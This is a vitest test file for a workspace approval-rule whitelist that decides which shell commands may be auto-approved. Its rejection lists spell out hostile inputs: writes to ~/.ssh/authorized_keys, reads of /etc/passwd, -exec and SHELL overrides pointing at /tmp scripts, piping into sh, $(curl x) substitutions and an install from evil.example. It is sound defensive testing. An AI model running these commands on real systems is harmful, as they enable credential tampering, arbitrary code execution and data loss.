import { describe, expect, it } from 'vitest';
import { deriveWorkspaceApprovalRule, matchWorkspaceApprovalRules, splitApprovalCommand } from './workspace-approval-rules.js';

const rules = (...patterns: string[]) => patterns.map(pattern => ({ pattern }));

describe('workspace approval rules', () => {
  it('derives rules only for whitelisted commands', () => {
    expect(deriveWorkspaceApprovalRule('pnpm test')).toBe('pnpm test');
    expect(deriveWorkspaceApprovalRule('pnpm test src/a.test.ts')).toBe('pnpm test');
    expect(deriveWorkspaceApprovalRule('git status --short')).toBe('git status');
    expect(deriveWorkspaceApprovalRule('git log --oneline -20 main..feature')).toBe('git log');
    expect(deriveWorkspaceApprovalRule('pnpm run build:web')).toBe('pnpm run build:web');
    expect(deriveWorkspaceApprovalRule('npm run lint')).toBe('npm run lint');
    expect(deriveWorkspaceApprovalRule('cargo test --workspace -p core parse')).toBe('cargo test');
    expect(deriveWorkspaceApprovalRule('go test -race -count=1 ./...')).toBe('go test');
    expect(deriveWorkspaceApprovalRule('make test')).toBe('make test');
    expect(deriveWorkspaceApprovalRule('pytest -q tests/unit')).toBe('pytest');
  });

  it('never derives a rule for commands outside the whitelist', () => {
    for (const command of [
      // finding 2：git 只收 status/diff/log/show。
      'git stash list', 'git branch -a', 'git tag', 'git worktree list', 'git rm x', 'git gc', 'git reflog', 'git update-ref x y', 'git fetch', 'git grep x',
      'git push origin main', 'git config core.hooksPath x', 'git -c core.pager=x log',
      // finding 3：npm init、config、pkg、install 与包装器、shell 保留字。
      'npm init -y', 'npm config get registry', 'npm pkg get name', 'pnpm install', 'npm install', 'yarn add x', 'busybox sh', 'tmux new', 'coproc ls', 'time ls',
      // pnpm 简写在脚本不存在时会执行同名程序；yarn run 同理。
      'pnpm lint', 'pnpm build', 'yarn run build', 'pnpm exec vitest', 'pnpm dlx x', 'npx vitest', 'npm x foo',
      "bash -c 'pnpm test'", 'sh -c ls', 'node scripts/x.js', 'python3 -m pytest', 'env FOO=1 pnpm test', 'FOO=1 pnpm test', 'sudo make test',
      './scripts/check.sh lint', '/usr/bin/git status', 'cargo run', 'go run .', 'go generate ./...', 'make', 'pnpm run', 'npm run-script build', 'rm -rf build', 'ls -la',
      'pnpm test && pnpm build', 'pnpm test; ls', 'pnpm test || ls', 'pnpm test | tee out', 'pnpm test $(whoami)', 'pnpm test `whoami`', 'pnpm test $HOME',
      'pnpm test > out.txt', 'pnpm test 2>&1', 'pnpm test < in.txt', 'diff <(ls) x', 'cat <<EOF', '(pnpm test)', '{ pnpm test; }', 'pnpm test &',
      'pnpm test *', "pnpm 'test'", 'pnpm "test"', 'pnpm te\\st', 'pnpm test # x', 'pnpm test ~/x', 'pnpm test\nls', 'pnpm test\r'
    ]) expect(deriveWorkspaceApprovalRule(command), JSON.stringify(command)).toBeUndefined();
  });

  it('rejects arguments that can write files, change config or run other programs (finding 1)', () => {
    for (const command of [
      'git log --output=/home/u/.ssh/authorized_keys', 'git diff --output=x', 'git diff --ext-diff', 'git show --textconv HEAD', 'git diff --no-index /etc/passwd x',
      'go test -exec=/tmp/x.sh ./...', 'go test -exec /tmp/x.sh ./...', 'go test -toolexec=x ./...', 'go build -o /tmp/x ./...', 'go test -ldflags=-extld=/tmp/x ./...',
      'go test github.com/evil/pkg', 'go test /abs/pkg', 'go test ../other/...',
      'make test SHELL=/tmp/x.sh', 'make test -f /tmp/Makefile', 'make test -C /tmp', 'make test other',
      'cargo test --config target.x.runner=/tmp/x', 'cargo build --manifest-path /tmp/x/Cargo.toml', 'cargo build --target-dir /tmp/x', 'cargo test -- --logfile x',
      'pytest -p evil', 'pytest -c /tmp/x.ini', 'pytest --basetemp=/', 'pytest --junitxml=x', 'pytest -o addopts=x', 'pytest ../outside',
      'npm test --script-shell=/tmp/x.sh', 'pnpm test --filter x', 'pnpm run build --config.x=y', 'pnpm test foo=bar', 'pnpm test /etc', 'yarn test ../x'
    ]) expect(deriveWorkspaceApprovalRule(command), JSON.stringify(command)).toBeUndefined();
  });

  it('covers a command only when every && or ; segment derives a saved rule', () => {
    const saved = rules('pnpm test', 'git status');
    expect(matchWorkspaceApprovalRules('pnpm test', saved)).toEqual([saved[0]]);
    expect(matchWorkspaceApprovalRules('pnpm test src/a.test.ts', saved)).toEqual([saved[0]]);
    expect(matchWorkspaceApprovalRules('git status && pnpm test src; pnpm test', saved)).toEqual([saved[1], saved[0]]);
    expect(matchWorkspaceApprovalRules('pnpm test;', saved)).toEqual([saved[0]]);
    for (const command of [
      'pnpm test && curl x', 'pnpm test; curl x', 'pnpm test || true', 'pnpm test | sh', 'pnpm testx', 'pnpm tes', 'pnpm', 'pnpm build', 'pnpm test --filter x',
      'pnpm test $(curl x)', 'pnpm test `curl x`', 'pnpm test > out.txt', 'pnpm test 2>&1', 'pnpm test & curl x', 'pnpm test &&', '&& pnpm test', 'pnpm test;; ls',
      'FOO=1 pnpm test', 'pnpm test && FOO=1 pnpm test', "pnpm test --filter 'a b'", 'pnpm test\nls', '(pnpm test)', 'pnpm test <(ls)', 'npm test --script-shell=x'
    ]) expect(matchWorkspaceApprovalRules(command, saved), JSON.stringify(command)).toBeUndefined();
    expect(matchWorkspaceApprovalRules('pnpm test', [])).toBeUndefined();
  });

  it('applies the argument limits when matching saved rules (finding 1)', () => {
    expect(matchWorkspaceApprovalRules('git log --output=/home/u/.ssh/authorized_keys', rules('git log'))).toBeUndefined();
    expect(matchWorkspaceApprovalRules('go test -exec=/tmp/x.sh ./...', rules('go test'))).toBeUndefined();
    expect(matchWorkspaceApprovalRules('make test SHELL=/tmp/x.sh', rules('make test'))).toBeUndefined();
    expect(matchWorkspaceApprovalRules('git log --oneline -5', rules('git log'))).toEqual(rules('git log'));
  });

  it('ignores saved rules that the whitelist would not derive (findings 2, 3, 4)', () => {
    for (const [command, pattern] of [
      ['pnpm exec bash', 'pnpm exec'], ['pnpm exec bash', 'pnpm'], ['bash -c ls', 'bash -c'], ['git stash clear', 'git stash'], ['git branch -D main', 'git branch'],
      ['npm config set script-shell=/tmp/x.sh', 'npm config'], ['npm init evil-pkg', 'npm init'], ['pnpm install https://evil.example/x.tgz', 'pnpm install'],
      ['pnpm test', 'pnpm test --filter'], ['./scripts/check.sh lint', './scripts/check.sh lint']
    ] as const) expect(matchWorkspaceApprovalRules(command, rules(pattern)), command).toBeUndefined();
  });

  it('splits only on unquoted && and ;', () => {
    expect(splitApprovalCommand('a b && c;d')).toEqual([['a', 'b'], ['c'], ['d']]);
    expect(splitApprovalCommand('a &&& b')).toBeUndefined();
    expect(splitApprovalCommand('')).toBeUndefined();
  });
});
